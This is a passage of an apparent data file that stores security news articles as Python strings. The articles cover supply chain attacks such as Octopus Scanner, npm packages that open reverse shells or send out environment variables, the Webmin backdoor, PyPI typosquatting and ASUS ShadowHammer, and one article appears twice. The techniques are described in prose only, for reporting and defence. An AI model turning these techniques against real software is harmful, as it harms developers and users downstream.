instances available online at the time had no password or authentication mechanism enabled.This year, a Swiss security researcher named Till Kottmann has also raised the same issue of misconfigured SonarQube instances. Throughout the year, Kottmann has gathered source code from tens of tech companies in a public portal, and many of these came from SonarQube applications.Most people seem to change absolutely none of the settings, which are actually properly explained in the setup guide from SonarQube, Kottmann told ZDNet.I dont know the current number of exposed SonarQube instances, but I doubt it changed much. I would guess its still far over 1,000 servers (that are indexed by Shodan) which are vulnerable by either requiring no auth or leaving default creds, he said.To prevent leaks like these, the FBI alert lists a series of steps that companies can take to protect their SonarQube servers, starting with altering the apps default configuration and credentials and then using firewalls to prevent unauthorized access to the app from unauthorized users.Update on December 14, 2020: SonarQube has also made modifications of its own. Starting with v8.6, released in December 2020, the app is now warning admins if they left the admin account enabled with a default or no password."
article23 = "Published on None. At least 26 different open-source code repositories were found to be infected with an unusual attack on the open-source software supply chain.The Octopus Scanner malware, which targets the Apache NetBeans Java integrated development environment (IDE), has been nesting in at least 26 GitHub source-code repositories, according to researchers – waiting to take over developer machines.A team from GitHub Security Labs, acting on a tip from a white-hat going by JJ, has found that the malware hides within GitHub-hosted open-source code bases, waiting to for developers to download a project from an infected repository. Once a developer does so, Octopus Scanner unfurls itself, first scanning the developers computer for the presence of NetBeans.NetBeans is a somewhat obscure IDE, which offers modular development components that developers can put together to create develop Java-based desktop, mobile and web applications, as well as HTML5 applications with HTML, JavaScript and CSS.It was interesting that this malware attacked the NetBeans build process specifically since it is not the most common Java IDE in use today, GitHub researchers noted, in a posting this week. If malware developers took the time to implement this malware specifically for NetBeans, it means that it could either be a targeted attack, or they may already have implemented the malware for build systems such as Make, MsBuild, Gradle and others as well and it may be spreading unnoticed.If Octopus Scanner detects NetBeans, it proceeds to install an initial-stage dropper, which in turn fetches and executes a remote access trojan (RAT), thus providing the attackers with full control over the target machine. Then, for persistence, the malware blocks overwrites and new project builds, so that the infected code isnt superseded with an update or any changes.Since the primary-infected users are developers, the access that is gained is of high interest to attackers since developers generally have access to additional projects, production environments, database passwords and other critical assets, the GitHub team wrote. There is a huge potential for escalation of access, which is a core attacker objective in most cases.In other words, by infecting the open-source supply chain in this manner, the malware can spread its tentacles far and wide. As Brian Fox, CTO at Sonatype, explained via email, Octopus Scanner spreads like a worm, promulgating itself by infecting the NetBeans projects that the developer is working on.Weve seen over 20 one-off attempts at malicious code injection within open-source software projects, but this is a new form of attack, he explained. This attack infects developer tools that subsequently infect all of the projects they are working on. Its been open season on open source for a number of years, developers are on the front lines, and a new weapon has arrived on the battlefront.In all, 26 source-code repositories have been found that contain the malware, which the GitHub team said has a low detection rate on VirusTotal. They determined that Octopus Scanner has probably been floating around in the GitHub waters since 2018.Octopus Scanner infects legitimate projects, including files that provide dependencies to the main pieces of a repositorys code. As such, its not possible to simply block or deleting the repositories or infected files – so cleanup can be labor-intensive.A NetBeans project build consists of multiple steps, but the Octopus Scanner malware is only interested in the pre-jar and post-jar tasks, explained the GitHub researchers. The pre-jar tasks provide hooks into the build at the point where all Java classes are compiled but before they are zipped into a final JAR artifact. The post-jar tasks provide hooks into the build at the point the JAR has actually been created.Sonatypes Fox added that the choice of infecting these files makes hunting Octopus Scanner a detailed endeavor: Ive always described this in terms of a tainted food project. If you inspect a salad recipe, youll find all of the common ingredient names (a.k.a. the manifest), but quality is not an attribute of the ingredient list. Tainted lettuce wont be listed as an ingredient, but that doesnt mean you wont end up with E. coli when using it.Also, the fact that it goes after open-source repositories means that the true area of Octopus Scanners activity could be difficult to assess, since various infected pieces of code can be used in untold numbers of projects and applications.it gives the malware an effective means of transmission since the affected projects will presumably get cloned, forked and used on potentially many different systems, according to GitHub researchers. The actual artifacts of these builds may spread even further in a way that is disconnected from the original build process and harder to track down after the fact.Erez Yalon, head of security research at Checkmarx, said via email that the issue illustrates security concerns involving third-party code and code reuse in general.Third party code modules have become a business necessity, as organizations race towards digital transformation, he said. When organizations enlist a third-party code module, it means they are trusting the third party to not be malicious and to prioritize security. Unfortunately, regardless of the trust instilled, we still encounter malicious activities in open source. We continue to see various malicious activities that target developers who use packages, often involving backdoors that are hidden as dependencies in legitimate projects (such as getcookies), typosquatting, as well as targeting the maintainer of the package (such as eslint-scope).Concerned about the IoT security challenges businesses face as more connected devices run our enterprises, drive our manufacturing lines, track and deliver healthcare to patients, and more? On June 3 at 2 p.m. ET, join renowned security technologist Bruce Schneier, Armis CISO Curtis Simpson and Threatpost for a FREE webinar, Taming the Unmanaged and IoT Device Tsunami. Get exclusive insights on how to manage this new and growing attack surface. Please register here for this sponsored webinar."
article24 = "Published on None. NPM has removed multiple packages hosted on its repository this week that established connection to remote servers and exfiltrated user data.These 4 packages had collected over 1,000 total downloads over the course of the last few months up until being removed by NPM yesterday.The four packages are:plutov-slack-client - claims to be a Node.JS Slack Client according to the information in the manifest nodetest199 - no description nodetest1010 - no description npmpubman - claims to be a simple implementation about Linux shell login according to the information in the manifestEstablishes a reverse shell to the attackers serverAlthough the malicious packages were spotted and removed by NPM, I was able to dig into Sonatypes automated malware detection system archives to obtain copies of their source code, as it had existed on NPM downloads.The first three packages plutov-slack-client, nodetest1010, and nodetest199 share identical code.The simplistic code contained within these packages is capable of running on both Windows and Unix-based systems.After the packages are installed, the code establishes a reverse shell to the attackers server, allowing the attacker to obtain remote access to the compromised machine.The first 3 packages (plutov-slack-client, nodetest1010, and nodetest199) establish a reverse shell to the attackers serverSource: BleepingComputerA key finding is, despite the 3 packages sharing identical code, the manifest file (package.json) contained within each of these has drastically different metadata about the whereabouts of the author and their GitHub profiles.It is plausible that either the data in package.json was faked by the malware author, or the malware author published these malicious packages using compromised GitHub and npm accounts belonging to different developers.Uploads user data to a remote serverThe last package on the list, npmpubman has a very different code structure and purpose.It collects user data from the environment variables and uploads this information to a remote host.Environment information as provided by NodeJS process.env can reveal sensitive information about a developers environment such as the PATH variable, database server, ports, API keys, etc.Malicious NPM package npmpubman exfiltrates environment variables to a remote serverSource: BleepingComputerIt is possible that all four packages were authored by the same attacker(s) despite conflicting data provided in the package.json manifests.In a real-world scenario, npmpubman could be used as a part of an attackers reconnaissance efforts to collect information about a system, whereas the other packages establish a direct connection between the attackers and the victims computers.As observed by BleepingComputer, the different NPM author accounts associated with these 4 packages have now been shut down by npm. Whereas, the GitHub repositories of the developers showed no recent traces of the packages ever being hosted there, despite package.json indicating such a possibility.Cases of malware infiltrating the open-source ecosystem have been on the rise. Merely last month, I had blogged about npm malware that went undetected and had been publishing users information on public GitHub pages in real-time.By exploiting the trust within the open-source community, attackers benefit from pushing their malicious code downstream to any developer or customer who may mistakenly include these malicious packages as a dependency in their application.These packages have been accounted for by Sonatype in their October malicious packages list, tracked as sonatype-2020-1013."
article25 = "Published on None. NPM has removed multiple packages hosted on its repository this week that established connection to remote servers and exfiltrated user data.These 4 packages had collected over 1,000 total downloads over the course of the last few months up until being removed by NPM yesterday.The four packages are:plutov-slack-client - claims to be a Node.JS Slack Client according to the information in the manifest nodetest199 - no description nodetest1010 - no description npmpubman - claims to be a simple implementation about Linux shell login according to the information in the manifestEstablishes a reverse shell to the attackers serverAlthough the malicious packages were spotted and removed by NPM, I was able to dig into Sonatypes automated malware detection system archives to obtain copies of their source code, as it had existed on NPM downloads.The first three packages plutov-slack-client, nodetest1010, and nodetest199 share identical code.The simplistic code contained within these packages is capable of running on both Windows and Unix-based systems.After the packages are installed, the code establishes a reverse shell to the attackers server, allowing the attacker to obtain remote access to the compromised machine.The first 3 packages (plutov-slack-client, nodetest1010, and nodetest199) establish a reverse shell to the attackers serverSource: BleepingComputerA key finding is, despite the 3 packages sharing identical code, the manifest file (package.json) contained within each of these has drastically different metadata about the whereabouts of the author and their GitHub profiles.It is plausible that either the data in package.json was faked by the malware author, or the malware author published these malicious packages using compromised GitHub and npm accounts belonging to different developers.Uploads user data to a remote serverThe last package on the list, npmpubman has a very different code structure and purpose.It collects user data from the environment variables and uploads this information to a remote host.Environment information as provided by NodeJS process.env can reveal sensitive information about a developers environment such as the PATH variable, database server, ports, API keys, etc.Malicious NPM package npmpubman exfiltrates environment variables to a remote serverSource: BleepingComputerIt is possible that all four packages were authored by the same attacker(s) despite conflicting data provided in the package.json manifests.In a real-world scenario, npmpubman could be used as a part of an attackers reconnaissance efforts to collect information about a system, whereas the other packages establish a direct connection between the attackers and the victims computers.As observed by BleepingComputer, the different NPM author accounts associated with these 4 packages have now been shut down by npm. Whereas, the GitHub repositories of the developers showed no recent traces of the packages ever being hosted there, despite package.json indicating such a possibility.Cases of malware infiltrating the open-source ecosystem have been on the rise. Merely last month, I had blogged about npm malware that went undetected and had been publishing users information on public GitHub pages in real-time.By exploiting the trust within the open-source community, attackers benefit from pushing their malicious code downstream to any developer or customer who may mistakenly include these malicious packages as a dependency in their application.These packages have been accounted for by Sonatype in their October malicious packages list, tracked as sonatype-2020-1013."
article26 = "Published on 2019-11-19 00:00:00. Warning: The binaries of the CLI wallet were compromised for a short timePosted by: ErCiccioneYesterday a GitHub issue about mismatching hashes coming from this website was opened. A quick investigation found that the binaries of the CLI wallet had been compromised and a malicious version was being served. The problem was immediately fixed, which means the compromised files were online for a very short amount of time. The binaries are now served from another, safe, source. See the reddit post by core team member binaryfate.Its strongly recommended to anyone who downloaded the CLI wallet from this website between Monday 18th 2:30 AM UTC and 4:30 PM UTC, to check the hashes of their binaries. If they dont match the official ones, delete the files and download them again. Do not run the compromised binaries for any reason.We have two guides available to help users check the authenticity of their binaries: Verify binaries on Windows (beginner) and Verify binaries on Linux, Mac, or Windows command line (advanced). Signed hashes can be found here: https://getmonero.org/downloads/hashes.txt.The situation is being investigated and updates will be provided soon.The Monero community"
article27 = "Published on None. Image: Webmin projectA backdoor mechanism was found in Webmin, a popular web-based application used by system administrators to manage remote Unix-based systems, such as Linux, FreeBSD, or OpenBSD servers.The backdoor mechanism would allow a remote attacker to execute malicious commands with root privileges on the machine running Webmin. Once this machine is compromised, an attacker could then use it to launch attacks on the systems managed through Webmin.Over one million Webmin installs are vulnerableThe attack surface is enormous -- without taking machines managed through Webmin into account. On its GitHub page, the Webmin team claims their application has over 1,000,000 installations worldwide. A Shodan search query returns over 215,000 public Webmin instances, which can be attacked without needing to compromise internal networks or to bypass firewalls to reach a Webmin installation.The project itself is extremely popular among Linux system admnistrators due to the convenience it brings to daily work. Sysadmins can install Webmin on a server and then use their web browser to make modifications to remote Unix systems.These modifications arent just basic disk quota updates and the ability to start or stop a few daemons. Webmin can allow system administrators to modify OS settings and internals, create new users, and even update the configurations of apps running on remote systems, such as Apache, BIND, MySQL, PHP, Exim, and many others.The project is huge in the Linux ecosystem, and comes with over 100 modules that expand its core features, support for all major distros, and off-shoot projects like Virtualmin and Usermin.How the Webmin backdoor was foundHowever, despite its popularity, the backdoor in Webmins code remained hidden in the projects source code for more than a year.First signs that something was wrong came to light when earlier this, Turkey-based security researcher Özkan Mustafa Akkuş found what he initially labeled as a vulnerability in the Webmin source code.The vulnerability allowed unauthenticated attackers to run code on the servers running the Webmin app.The bug received a vulnerability ID of CVE-2019-15107, and Akkuş presented his finding at the AppSec Village at the DEF CON 27 security conference held in Las Vegas at the start of the month.However, after presenting at such a high-profile conference, other security researchers also started digging into what appeared to be a very dangerous security flaw in a very popular Linux utility.This additional digging has resulted in new information being discovered over the weekend.Webmin blames compromised build infrastructureAccording to one of the Webmin developers, the vulnerability was not the result of a coding mistake, but was actually malicious code injected into compromised build infrastructure.The code was only present in Webmin packages offered for download via SourceForge, but not the GitHub. However, this doesnt reduce the impact of this issue, as the Webmin website lists SourceForge links as the official download URLs.The Webmin team also didnt specify if the compromised build infrastructure was referring to a compromised developer machine where the code was created, or to a compromised SourceForge account, which the hacker might have used to upload their own malicious Webmin version on SourceForge.For its part, Sourceforce said through the voice of its president that the hacker didnt exploit any vulnerability in the platform, and that SourceForge only hosted what the project admins had uploaded through their accounts.Webmin installs not vulnerable by defaultPer Akkuşs initial technical analysis, the vulnerability existed in a Webmin feature that allows Webmin admins to enforce a password expiration policy for Webmin web-based accounts.If this Webmin feature is enabled, then an attacker can use it to take over a Webmin install by appending shell commands using the | character inside an HTTP request sent to the Webmin server.According to the Webmin team, all versions between 1.882 to 1.921 downloaded from Sourceforge contained the malicious backdoor code.Webmin version 1.930 was released yesterday, August 18, to remove the backdoor mechanism. This also means backdoored Webmin versions were downloaded hundreds of thousands of times for more than a year, since March 2018.The good news is that Webmin, in default installs, does not ship with the password expiration feature enabled by default. Webmin admins must make modifications to the Webmin config file to enable the password expiration feature for Webmin accounts, meaning most Webmin installations are most likely safe from exploitation attempts.The bad news is that the hacker responsible for compromising Webmins build infrastructure appears to have tried to change the default state of the password expiration feature in Webmin 1.890, when it turned this feature on by default for all Webmin users.However, the modification was sloppy, and caused errors for some users, who reported the issue to Webmin admins, who then reverted back to the previous off-by-default state with the next release.Either way, upgrading to version 1.930 is strongly recommended, the Webmin team said in a security advisory published yesterday.Alternately, if running versions 1.900 to 1.920, edit /etc/webmin/miniserv.conf, remove the passwd_mode= line, then run /etc/webmin/restart.10 Linux distros: From different to dangerousMore vulnerability reports:"
article28 = """Package
 load-from-cwd-or-npm (
npm
)
Affected versions
= 3.0.2
Patched versions
3.0.4
Description
Version 3.0.2 of load-from-cwd-or-npm contains malicious code. The malware breaks functionality of the purescript-installer package by injecting targeted code.

Recommendation
Upgrade to version 3.0.4 or later. There is no indication of further compromise.

References
https://www.npmjs.com/advisories/1082
Reviewed on Aug 31, 2020
Published to the GitHub Advisory Database on Sep 3, 2020
Last updated on Jan 9
Severity
Critical
9.8
/ 10
CVSS base metrics
Attack vector
Network
Attack complexity
Low
Privileges required
None
User interaction
None
Scope
Unchanged
Confidentiality
High
Integrity
High
Availability
High
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Weaknesses
CWE-506
CVE ID
No known CVE
GHSA ID
GHSA-jxf5-7x3j-8j9m
Source code
No known source code"""
article29 = "Published on 2019-06-07 00:05:00+00:00. On June 4, 2019 at approximately 5pm UTC, the Komodo team received a private notification from npm (Node Package Manager, a popular tool to include external Node.js libraries into any project) about a vulnerability in one of the upstream libraries Komodos Agama wallet was using.The Komodo team would like to thank the npm security team for handling the situation so quickly and professionally.If you had funds stored in Komodos Agama wallet and those funds were moved without your knowledge or permission, please complete this form at your earliest convenience. Please note you will need to fill a separate form for each asset. It is essential that all Agama users who had their funds moved fill out the form.An Overview of the VulnerabilityKomodos version of Agama wallet was using a Node.js module that contained malicious code. The infected module was collecting user seed phrases and storing them on a publicly accessible server. Please read this post on the npm blog for more details about the malicious code and how it was inserted.Please note that only Komodos version of Agama wallet was affected. Verus Coin, a project within the Komodo ecosystem that maintains a distinct version of Agama, was not affected by this vulnerability.The Verus Agama wallet is completely secure and one of the recommended wallets in which to store your KMD. Verus Coin supports a number of ecosystem coins, including KMD, VRSC, and ARRR, as well as BTC, ETH, and other major digital assets.It now seems clear that the bug was created intentionally to target Komodos version of Agama wallet. A hacker spent several months making useful contributions to the Agama repository on GitHub before inserting the bug. Eventually, the hacker added malicious code to an update of a module that Komodos Agama was already using.The update contained malicious code that stored all seed phrases on a public server. The hacker saved the seed phrases on a public server to obscure his/her identity and to create a scenario where anyone could be a suspect when the vulnerability was finally exploited.Understanding the VulnerabilityThe KMD blockchain was not affected in any way. There is no vulnerability with the KMD blockchain or any other blockchain launched with Komodos technology. There is absolutely no need for a rollback or a hard fork. Its crucial to understand that this was not a 51% attack or any other kind of attack on the KMD chain.Rather, it was a security vulnerability in an external module that the code base of Agama wallet depended upon. The Komodo Team was made aware of the vulnerability and took immediate action to protect user funds and eliminate the threat.In addition, only Komodos version of Agama was affected. The Verus Agama wallet is completely secure and one of the recommended wallets in which to store your KMD.Komodos Response to the VulnerabilityOnce the Komodo Dev Team learned that users seed phrases were being exported from Komodos Agama and catalogued, the decision was made to exploit the bug before a bad actor could do so.After review, it seems the attacker had started emptying wallets before the Komodo Dev Team jumped into action. At the time, the Komodo Dev Team did not know that the attacker was already stealing funds and made the decision to secure vulnerable funds independently. Now, it is very clear that the Komodo team was in a race against the attacker to move all the funds in compromised wallets.Using the seed phrases stored on the publicly accessible server, the Komodo Dev Team opened the compromised wallets and moved the funds to a secure wallet.It is important to note that the Komodo Dev Team does not have access to anyones private keys, seed phrases, or funds, including Agama wallet users.The only way that the Komodo Dev Team was able to move users funds in this case was by accessing the trove of seed phrases that the attackers malicious module had saved.Approximately 8 Million KMD and 96 BTC are now in a secure wallet being safeguarded by the Komodo Dev Team. All funds will be returned to users once they generate a new, secure wallet, complete the Missing Funds Claim Form, and send a small transaction from the old wallet.How To Reclaim Your Swept FundsIf you had funds stored in Agama wallet that someone else sent to a different address, the first step is to complete this Missing Funds Claim Form.The reclaim process will begin with wallets that had less than 7777 KMD in them and are undisputed (meaning that only one missing funds claim was made for that wallet). If you meet these conditions then please read this support guide to learn more about the reclaim process.The process will be simple and blockchain-based. First, a very small fraction of a KMD coin was sent to all addresses from which funds were swept. This step is already complete.Second, the rightful owner of that address must access their compromised wallet and send that small amount of KMD to the same destination address specified in the Missing Funds Claim Form. This verifies that the same individual who completes the form is the rightful owner of the funds they are reclaiming.Finally, the Komodo Team will return all funds moved in the security sweep. The Komodo Dev Team aims to process all of these undisputed refunds of less than 7777 KMD by June 15. Please be patient during this time.For all other wallets— those with more than 7777 KMD and those for which multiple Missing Funds Claim Forms were completed— more details will follow soon. The Komodo Team aims to have all of these funds returned by June 30.The Extent of the LossesIn total, the hacker managed to gain control of approximately 1 Million KMD. This is less than one percent of the circulating supply of KMD and roughly 0.5% of the total supply. The total supply of KMD is approximately 200 Million and will be reached around the year 2030.The Komodo Dev Team is still conducting an analysis of the attack and the Support Team is still gathering information from users about funds that were either swept to a secure address or stolen by the attacker, so detailed plans have not yet been made.However, its important to note that the Komodo team will be doing everything possible to make sure everyone gets all of their funds back. Komodos Lead Developer James jl777 Lee has pledged donate 500,000 KMD from his personal holdings to compensate users who lost their funds in this attack. More details will be released in the coming days.Keeping the Komodo Ecosystem SecureIn place of Agama wallet, we are releasing a new wallet, AtomicDEX— a hybrid product that is both a multi-coin wallet and a decentralized exchange. AtomicDEX relies on newer, more advanced and more secure technologies.One important aspect of AtomicDEXs features is that it only utilizes dependencies that are reviewed by security experts. The new software environment and architecture of AtomicDEX will make security vulnerabilities less likely.The Komodo team always makes security the highest priority. Our security team is constantly monitoring our network and blockchain activities to ensure the safety of our users.Special ThanksThe Komodo team would like to thank the community for such overwhelming support through this difficult situation. While it is surely frustrating to have funds moved without ones knowledge or permission, the Komodo community has been extraordinarily patient and understanding. For that, the Komodo team is very grateful.The Komodo team would also like to thank the Verus Coin team and Verus Coin Developer Michael Filip Toutonghi, who is the Lead Developer for Verus Agama wallet. The Verus Coin team has done an enormous amount of work on their own version of Agama wallet and added several innovative features. The Komodo team would like to thank Verus Coin for all their hard work and for providing such an outstanding alternative product for Komodo community members to use.The Verus Agama wallet is completely secure and one of the recommended wallets in which to store your KMD.Moving ForwardIf you had funds stored in Agama wallet and those funds were moved without your knowledge or permission, please complete this form at your earliest convenience. It is essential that all Agama users who had their funds moved fill out the form.In the coming days, more updates about this vulnerability and the reclaim process will be published. The Komodo team believes firmly in transparency and will continue to keep the community fully informed. In particular, the Komodo team will soon announce details about the reclaim process for swept wallets that held over 7777 KMD, disputed wallets, and wallets whose funds were stolen.Thanks again for your continued support.📧Komodo NewsletterIf youd like to learn more about blockchain technology and keep up with Komodos progress, subscribe to our newsletter. Begin your blockchain journey with Komodo today."
article30 = "Published on None. Malicious actors are constantly on the lookout for new attack vectors and techniques, using them to infiltrate even the most secure of organizations. Many organizations have adopted security best practices, such as defense-in-depth and diversity of defense, and continue to improve their security posture to impede attackers.Attacking an organization head-on will likely yield fewer results and will typically be detected earlier than taking a covert approach, such as using spear phishing to target individuals. One major covert attack vector is the software supply chain, in which the attacker doesnt target the organization itself. Instead, supply chain attacks target a trusted vendor or multiple vendors who provide the organization with software or services. Additionally, as software delivery continues to evolve, a new set of providers often referred to as package manager repositories have emerged to serve software development companies.Popular package manager repositories for software developers are PyPI, RubyGems, NuGet, and npm, to name a few. Such repositories serve thousands, if not millions of software developers around the world. Developers are able to accelerate their own projects by openly sourcing software components to meet their needs. Its too cumbersome (and potentially insecure) to reinvent the wheel whenever a developer needs to implement a common functionality; one that has already been implemented by someone else as a library or a module, and has been proven to work correctly. Do you need to make an HTTP request in Python? You can use the requests PyPI package. Would you like to manage RabbitMQ through Ruby? You can do it with the rabbitmq_manager Ruby gem.Python Package Index, commonly known as PyPI or Cheese Shop, has been the target of misuse on several occasions. The most common attack approach is named typosquatting, in which an attacker deliberately makes typos when naming malicious packages (such as djanga instead of django) in the hope that an unsuspecting user will accidentally mistype the name and install the malicious package. PyPI has removed the affected packages, but theres still the question if they were the only ones.To satisfy our curiosity, we processed the entire PyPI repository with our Titanium Platform static analysis solution running on a single server with two AMD EPYC 32 core processors, 256 GB of RAM, and two 3.5 TB NVMe SSD disks. The data set contained 1,584,049 files, including all packages and their historical versions, with the total size of 2.61 TB. The packages were processed in a little less than a day (more specifically, in 23 hours and 44 minutes), and the Titanium Platform managed to unpack 289.4 million files from the input data set, of which 55.8 million were unique. To get a better glimpse into the unpacked files, a filetype distribution snapshot was taken and can be seen in Figure 1. Most of the Binary column consists of two archive formats, TAR and GZIP, since the majority of files in the repository were .tar.gz archives, while the Text column mostly covers Python scripts and various setup and configuration files.However, a lot of packages contain executable files for various operating systems (such as PE, ELF, and MachO files). One example is a package that can be used to compare files and see the differences between them, and as a testing sample set, it includes a variety of executable and non-executable file formats. The issue here is that when users pull the package from the repository, they might get more than what they bargained for.Figure 1 - Filetype distributionOur processing effort included an additional set of custom YARA rules modelled after the malicious data set exposed by other researchers. We were able to find a package that the initial analysis had missed, and which was still available in the PyPI repository at the time of writing. The affected package name is libpeshnx, developed by user ruri12, and released on November 23, 2017, as illustrated in the screenshot below. The name libpeshnx looks like a variant of another (previously reported) package by the same author, called libpeshka. Two additional packages have been identified, called libpesh and libari, but they only contain references to the malicious function without any code.Figure 2 - Available packagesThe backdoor logic is extremely simple, and has been succinctly described when libpeshka had first been found. In a nutshell, if the package is installed on a Linux system, it will try to download a file from the C2 domain, save it as a hidden file named .drv in the users home directory, and persist itself inside .bashrc to be run as a background process whenever an interactive non-login shell is created (i.e. any time a shell is opened after the initial login). The complete source code can be seen in Figure 3.Figure 3 - Backdoor downloader codeLuckily, the package looks like a development version of the malware. When the package is installed with pip, it doesnt automatically run the malicious function, but it does install the function as a library. It also creates an eggsecutable script, which can then be used to execute the malicious payload out-of-the-box. Alternatively, the malicious library can be imported, but the precise module and function names have to be known and executed. Additionally, the C2 server seems to have been offline for quite some time (it was already offline 7 months ago, during the initial libpeshka disclosure).Nonetheless, it is troubling because there have been 82 installations of libpeshnx monthly on average (the exact installation breakdown per month can be seen in Figure 4), and other ruri12s packages have been installed even more frequently. PyPIs security team has been contacted, and the packages have been removed from the repository. Wed like to thank them for their prompt response.Figure 4 - Monthly number of libpeshnx installationsGiven the lack of scrutiny involved during the package submission, review, and approval process, and the attack surface size that such platforms provide, public package repositories might slowly become a malware repository platform, unless their security posture changes. To greatly reduce the possibility of hosting malware, such repositories would all benefit from continuous processing and a better review process.Until then, be careful what you type, because youre just the attackers type.Affected packages and SHA256:libari-0.1, 1f45d5e3948533c2c7f389968e006a7e33b6b79348d4375f3de60ea47a75d2cclibari-0.2, 669f4ab40636f59470496ae0da9d852294b2d5918a7242d0bd8f5ba489abae5blibari-0.3, 5639a4c6aa9ec39f37644a543f9b5a04e7fa5aa63843602c94db91034461d8f1libpesh-0.1, 0eaa213c631966e2f08d858c9b4766ecc5a6f49dd2a75f91c74781f447af6b4elibpeshnx-0.1, b828582a6dd07ba10ff71ecbb4300866f690e46efb23a969ffd29c8990f7880eDisclosure timeline:07/09/2019 - Contacted PyPI security team, packages have been removed promptly"
article31 = "Published on 2019-06-07 19:43:04+00:00. As a follow up to Security issue on ROS build farm we have now deployed new GPG keys to packages.ros.org. This will require anyone using packages.ros.org to update your trusted GPG keys to be able to update packages going forward.tldr; At this point you should do the following 3 things:Add the new ROS GPG key to your apt keyring if you have not already.Revoke the old GPG key, its no longer used.If using testing update the ros-shadow-fixed repository to refer to ros-testing repository.How to transitionBelow are instructions for how to update your GPG keys.Adding the new ROS repository keyWho should do this?Everyone who installs ROS packages from packages.ros.orgWhen should this be done?NowWhat to do?Set up the new repository keysudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654Removing the old ROS repository keyWho should do this?Everyone.When must this be done?NowWhat to do?Remove the key from your apt keyringsudo apt-key del 421C365BD9FF1F717815A3895523BAEEB01FA116Updating the testing repository urlWho should do this? Anyone who is currently using the ros-shadow-fixed repository to test ROS packages before a sync.Check your /etc/apt/sources.list and /etc/apt/sources.list.d/*.list for http://packages.ros.org/ros-shadow-fixed and replace it with http://packages.ros.org/ros-testingMigrating to Snapshots.ros.org for unsupported distribitionsFor older unsupported distributions we have moved the debian packages to a new host. Details for how to set that up are in this post: Security issue on ROS build farm - #8 by nuclearsandwichMore detailed explanations can be found in this post:"
article32 = "Published on None. Over a million users might have downloaded and installed a backdoored version of an ASUS application that was served from the companys official update servers. The incident is the latest in a string of software supply chain attacks that have come to light over the past couple of years and highlights the need for companies to better vet the applications and updates they deploy on their systems.According to a report released Monday by security firm Kaspersky Lab, hackers created a trojanized version of a legitimate application called the ASUS Live Update Utility, signed it with valid certificates belonging to ASUS, and distributed it to users through the applications own update mechanism. This indicates that, at the very least, hackers had access to ASUSs code signing and update infrastructure.Based in Taiwan, ASUSTeK Computer, commonly known as ASUS, is one of the worlds largest manufacturers of computers and computer components. The ASUS Live Update Utility comes preinstalled on many Windows computers made by the company and is used to deliver updates for BIOS/UEFI firmware, hardware drivers and other ASUS tools. The utility can also be installed manually by users after a clean Windows installation.The backdoored version of ASUS Live Update was discovered by researchers from antivirus firm Kaspersky Lab in January after adding new technology to its products for detecting unusual code added to larger applications and other anomalies that could indicate supply-chain attacks. After collecting additional samples and data, the researchers determined the attack began in June and ended in November last year.Based on our statistics, over 57,000 Kaspersky users have downloaded and installed the backdoored version of ASUS Live Update at some point in time, the researchers said in their report. We are not able to calculate the total count of affected users based only on our data. However, we estimate that the real scale of the problem is much bigger and is possibly affecting over a million users worldwide.Kasperskys telemetry data shows the highest number of computers affected by ShadowHammer in Russia, Germany and Italy. However, the victim distribution is influenced by the distribution of Kaspersky customers around the world. Symantec also confirmed the attack Monday and said that it found malicious versions of ASUS Live Update on 13,000 computers, 20 percent belonging to businesses. The companys data showed a more even spread of infections around the world with 13 percent in the US.The security firm has dubbed the attack ShadowHammer and plans to release a whitepaper with additional technical details next month at its Security Analyst Summit (SAS) conference.Secondary payload delivered to specific targeted ownersBy targeting a software application used by millions of users, the attackers appear to have cast a very wide net. However, this was just a convenient way to reach their real target: around 600 systems that received a secondary payload and whose owners have not yet been identified.The malicious ASUS Live Update samples found by Kaspersky contained around 600 hard-coded MAC addresses — unique hardware identifiers for network adapters — and the second-stage payload was only delivered to systems that had those MAC addresses. Its not clear what that malicious component was designed to do because the server that hosted it was already down when Kaspersky discovered the attack. However, the company has developed a tool that allows users to check if their computers are among those targeted and hopes to recover a sample of the payload for analysis.The attack is very similar to the one that involved trojanized CCleaner versions being distributed to 2.2 million users in 2017. That attack was attributed to an APT group known in the security industry as Barium or Winnti, and it too involved a second stage malware payload that was deployed on a small number of systems belonging to technology companies, including ASUS.One supply chain attack can lead to anotherCostin Raiu, the director of Kasperskys global malware research and analysis team, tells CSO that there are certain similarities between the two attacks, as well as an earlier one dubbed ShadowPad that was also attributed to Barium. While the conclusion is not definitive, its possible the latest ASUS Live Update attack was carried out by the same group, and its also possible that hackers might have gained access to ASUSs network and infrastructure as a result of the earlier CCleaner attack, he says.Thats one of the risks with these targeted software supply-chain attacks: They tend to snowball. One attack can provide hackers with access to a technology company and that companys software can then be compromised and used to launch attacks against additional companies and so on. Also, during these attacks hackers collect information about the infected systems, so even if a company was not among the victims that received a secondary payload in this campaign, it might become a target in a future supply-chain attack, Raiu says.Multiple groups using similar supply chain attack technologiesPrevious research by Microsoft suggests there are two groups under the Winnti umbrella that share the same tools. One of them is tracked as Barium and its targets have historically been companies from the gaming industry, possibly for monetization purposes, and the other is called Lead and its goal appears to be industrial espionage, its target being companies and organizations from various industries.Earlier this month, researchers from security firm ESET reported that supply-chain attacks attributed to Winnti resulted in the backdooring of two games and one gaming platform. Kaspersky has found technical similarities between those attacks and the ASUS one, suggesting they could be related.Its possible that systems compromised in these supply chain attacks could be used to select future targets for either of the Winnti groups, the one targeting the gaming industry or the one interested in industrial espionage, Raiu says.Asus did not immediately respond to a request for comment about the reported ShadowHammer attack.Vendors, users struggle to protect against supply chain attacksIts very hard for consumers and companies to protect themselves against software supply chain-attacks when they involve proprietary software because users only receive the compiled binary files and have little choice but to trust that vendors deliver clean updates.In the world of open-source software there are technical solutions such as reproducible builds that can catch malicious modifications of binaries, including the addition of backdoors. This is a method of deterministic compilation where binaries compiled from the same source code by multiple parties, including automated systems, should be byte for byte identical regardless of configuration variations in the compiling environments. Unfortunately, such solutions dont work for proprietary software because no third parties have access to the source code to independently verify the authenticity of the resulting binaries.One way for companies to reduce risk is to choose software vendors with a good security track record. Before making new software acquisitions or extending existing contracts, organizations could ask vendors for the results of security audits performed against their networks and infrastructure. This wouldnt guarantee that a particular vendor cant be compromised, but it would indicate that it cares enough about security to at least perform such assessments.If a compromise does happen, organizations should at least be confident that their chosen software suppliers are capable of discovering the breach, remediating the problem and notifying affected parties in a timely manner.Another thing that companies can do is test software updates inside a virtual machine environment before deploying them on production systems, Raiu says. This can be used to discover if updates exhibit suspicious behavior after 